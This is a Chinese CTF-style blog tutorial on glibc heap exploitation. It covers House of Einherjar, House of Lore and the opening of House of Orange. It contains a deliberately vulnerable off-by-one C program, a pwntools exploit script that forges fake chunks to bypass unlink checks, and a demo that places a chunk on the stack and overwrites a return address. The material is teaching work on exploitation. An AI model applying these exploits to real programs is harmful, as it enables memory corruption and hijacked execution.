<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>堆溢出-Housese_Of_XXX - ggb0n&#039;s Blog</title><meta description="House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同"><meta property="og:type" content="article"><meta property="og:title" content="堆溢出-Housese_Of_XXX"><meta property="og:url" content="http://ggb0n.cool/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:published_time" content="2020-06-06T16:41:46.000Z"><meta property="article:modified_time" content="2020-06-07T14:52:22.123Z"><meta property="article:author" content="ggb0n"><meta property="article:tag" content="categories-java"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/"},"headline":"堆溢出-Housese_Of_XXX","image":["http://www.ggb0n.cool/images/back2.png"],"datePublished":"2020-06-06T16:41:46.000Z","dateModified":"2020-06-07T14:52:22.123Z","author":{"@type":"Person","name":"ggb0n"},"description":"House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同"}</script><link rel="alternative" href="/atom.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo1.png" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/tools">CyberChef</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-06-06T16:41:46.000Z">2020-06-07</time><a class="commentCountImg" href="/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/#comment-container"><span class="display-none-class">a1a6c8ae7225ac274f3e9e6c877cd217</span><img class="not-gallery-item" src="/img/chat.svg"> <span class="commentCount" id="a1a6c8ae7225ac274f3e9e6c877cd217"> 99+</span>    </a><span class="level-item">34 minutes read (About 5106 words)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">堆溢出-Housese_Of_XXX</h1><div class="content"><p>House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。 由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同。<a id="more"></a></p>
<p>但是《The Malloc Maleficarum》依然是一篇推荐阅读的文章，可以在这里读到它的原文： <a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt</a></p>
<h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p>
<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h5 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h5><p><code>free</code> 函数中的后向合并核心操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    <span class="built_in">size</span> += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体过程如下：</p>
<p><img src="http://ggb0n.cool/images/heap4.png" alt=""></p>
<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>首先，在之前的堆的介绍中，我们可以知道以下的知识：</p>
<ul>
<li>两个物理相邻的 chunk 会共享 <code>prev_size</code>字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 <code>prev_size</code> 字段。</li>
<li>一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。</li>
<li>后向合并时，新的 chunk 的位置取决于 <code>chunk_at_offset(p, -((long) prevsize))</code> 。</li>
</ul>
<p>那么如果我们可以同时控制一个 <strong>chunk prev_size</strong> 与 <strong>PREV_INUSE</strong> 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p>
<h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><p><strong>溢出前</strong>：假设溢出前的状态如下图所示：</p>
<p><img src="http://ggb0n.cool/images/heap5.png" alt=""></p>
<p><strong>溢出</strong>：这里我们假设<code>p0</code>堆块一方面可以写<code>prev_size</code>字段，另一方面，存在<code>off by one</code>的漏洞，可以写下一个 chunk 的<code>PREV_INUSE</code>部分，那么：</p>
<p><img src="http://ggb0n.cool/images/heap6.png" alt=""></p>
<p><strong>溢出后</strong>：假设我们将<code>p1</code>的 <code>prev_size</code> 字段设置为我们想要的目的 chunk 位置与 <code>p1</code> 的差值。在溢出后，我们释放 <code>p1</code>，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p>
<p><img src="http://ggb0n.cool/images/heap7.png" alt=""></p>
<h4 id="攻击过程示例"><a href="#攻击过程示例" class="headerlink" title="攻击过程示例"></a>攻击过程示例</h4><p>可以进行 House Of Einherjar 攻击的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);　<span class="comment">//构造fake chunk</span></span><br><span class="line">    <span class="keyword">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);　</span><br><span class="line">    <span class="keyword">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//为了不让s2与top chunk 合并</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"begin\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input s0\n"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//读入fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input s1\n"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./example"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"begin\n"</span>)</span><br><span class="line">address = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">"input s0\n"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">"A"</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p64(address) * 2是为了绕过</span></span><br><span class="line"><span class="string">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span></span><br><span class="line"><span class="string">  malloc_printerr ("corrupted double-linked list");</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="comment">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"input s1\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">"\x00"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>利用 unlink 漏洞的时候：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">p-&gt;fd = &amp;p<span class="number">-3</span>*<span class="number">4</span></span><br><span class="line">p-&gt;bk = &amp;p<span class="number">-2</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>在这里利用时，因为没有办法找到 <code>&amp;p</code> , 所以直接让：</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>fd = p</span><br><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>bk = p</span><br></pre></td></tr></table></figure>

<p>这里需要注意一个点：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>x101) + p64(<span class="name">address</span>) * <span class="number">2</span> + <span class="string">"A"</span>*0xe0</span><br></pre></td></tr></table></figure>

<p>其实修改为下面这样也是可以的:</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>x221) + p64(<span class="name">address</span>) * <span class="number">2</span> + <span class="string">"A"</span>*0xe0</span><br></pre></td></tr></table></figure>

<p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code> 才合理，但是为什么 <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      <span class="selector-tag">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure>

<p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里我们总结下这个利用技术需要注意的地方：</p>
<ul>
<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分</li>
<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址</li>
<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测</li>
</ul>
<p>其实，该技术与 chunk extend/shrink 技术比较类似。</p>
<h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p>
<p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从中可以看出，如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p>
<h4 id="攻击过程代码"><a href="#攻击过程代码" class="headerlink" title="攻击过程代码"></a>攻击过程代码</h4><p>示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">puts</span>(<span class="string">"Nice jump d00d"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with the small one during the free()\n"</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>, stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是：</strong></p>
<ul>
<li><p>1、<code>void *p5 = malloc(1000);</code> 是为了防止和 victim_chunk 之后和 top_chunk 合并。</p>
</li>
<li><p>2、<code>free((void*)victim)</code>，victim 会被放入到 unsort bin 中去，然后下一次分配的大小如果比它大，那么将从 top chunk 上分配相应大小，而该 chunk 会被取下 link 到相应的 bin 中。如果比它小 (相等则直接返回)，则从该 chunk 上切除相应大小，并返回相应 chunk，剩下的成为 last reminder chunk , 还是存在 unsorted bin 中。</p>
</li>
</ul>
<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><p>House of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange。</p>
<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是<strong>特殊之处在于题目中不存在 free 函数或其他释放堆块的函数</strong>。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p>
